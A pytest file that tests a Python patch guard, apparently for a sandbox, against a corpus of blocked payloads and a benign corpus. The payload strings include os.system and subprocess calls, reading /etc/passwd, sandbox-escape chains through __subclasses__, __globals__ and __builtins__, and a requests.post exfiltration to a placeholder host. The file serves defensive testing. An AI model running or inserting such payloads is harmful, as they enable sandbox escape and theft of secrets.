import pytest

from app.guards import verify_patch, verify_syntax
from app.sandbox import _extract_assertions


def test_verify_syntax_accepts_valid_code():
    assert verify_syntax("def ok():\n    return 1\n")


def test_verify_patch_blocks_dangerous_imports():
    result = verify_patch("import os\n\ndef run():\n    return os.environ\n")
    assert not result.ok
    assert "denied import: os" in result.errors


def test_verify_patch_blocks_eval():
    result = verify_patch("def run(payload):\n    return eval(payload)\n")
    assert not result.ok
    assert "denied call: eval" in result.errors


def test_extract_assertions_keeps_test_layer_only():
    content = "def bug():\n    pass\n# --- Automated Test Assertion Layer ---\ndef test_x():\n    assert True\n"
    assert _extract_assertions(content).lstrip().startswith("def test_x")


# --- Adversarial corpus: every payload below MUST be blocked --------------- #

ADVERSARIAL_PATCHES = {
    "os_system": "import os\nos.system('id')\n",
    "subprocess": "import subprocess\nsubprocess.run(['ls'])\n",
    "aliased_import": "import os as o\n\ndef run():\n    return o.getcwd()\n",
    "dotted_import": "import os.path\n\ndef run():\n    return os.path.exists('/')\n",
    "from_import": "from os import system\nsystem('id')\n",
    "dunder_import_call": "x = __import__('os')\n",
    "eval_call": "def run(p):\n    return eval(p)\n",
    "exec_call": "def run(p):\n    exec(p)\n",
    "compile_exec": "def run(p):\n    exec(compile(p, '<s>', 'exec'))\n",
    "eval_aliased_reference": "f = eval\n\ndef run(p):\n    return f(p)\n",
    "open_file": "def run():\n    return open('/etc/passwd').read()\n",
    "getattr_escape": "def run(o):\n    return getattr(o, '__class__')\n",
    "setattr_escape": "def run(o):\n    setattr(o, 'x', 1)\n",
    "class_bases_escape": "def run():\n    return ().__class__.__bases__[0].__subclasses__()\n",
    "func_globals_escape": "def run(f):\n    return f.__globals__\n",
    "builtins_escape": "def run():\n    return ().__class__.__mro__[1].__builtins__\n",
    "requests_exfil": "import requests\nrequests.post('http://x', data='secret')\n",
    "socket_exfil": "import socket\ns = socket.socket()\n",
    "pickle_rce": "import pickle\npickle.loads(b'')\n",
    "importlib_bypass": "import importlib\nimportlib.import_module('os')\n",
}


@pytest.mark.parametrize("name", sorted(ADVERSARIAL_PATCHES))
def test_guard_blocks_adversarial_payloads(name):
    result = verify_patch(ADVERSARIAL_PATCHES[name])
    assert not result.ok, f"guard failed to block: {name}"
    assert result.errors


# --- Benign corpus: none of these may be falsely flagged ------------------- #

BENIGN_PATCHES = {
    "simple_logic": "def avg(xs):\n    return sum(xs) / len(xs) if xs else 0.0\n",
    "math_import": "import math\n\ndef hypot(a, b):\n    return math.sqrt(a * a + b * b)\n",
    "json_import": "import json\n\ndef dumps(d):\n    return json.dumps(d)\n",
    "regex_import": "import re\n\ndef digits(s):\n    return re.findall(r'\\d+', s)\n",
    "collections_import": "from collections import defaultdict\n\ndef group(xs):\n    d = defaultdict(list)\n    for k, v in xs:\n        d[k].append(v)\n    return d\n",
    "typing_import": "from typing import Optional\n\ndef first(xs) -> Optional[int]:\n    return xs[0] if xs else None\n",
    "statistics_import": "import statistics\n\ndef med(xs):\n    return statistics.median(xs) if xs else 0.0\n",
    "try_except": "def parse(s):\n    try:\n        return int(s)\n    except ValueError:\n        return 0\n",
    "isinstance_check": "def label(x):\n    return 'num' if isinstance(x, (int, float)) else 'other'\n",
    "comprehension": "def squares(n):\n    return [i * i for i in range(n)]\n",
}


@pytest.mark.parametrize("name", sorted(BENIGN_PATCHES))
def test_guard_allows_benign_patches(name):
    result = verify_patch(BENIGN_PATCHES[name])
    assert result.ok, f"false positive on benign patch {name}: {result.errors}"


def test_guard_reports_syntax_error():
    result = verify_patch("def broken(:\n    pass\n")
    assert not result.ok
    assert any("syntax error" in e for e in result.errors)
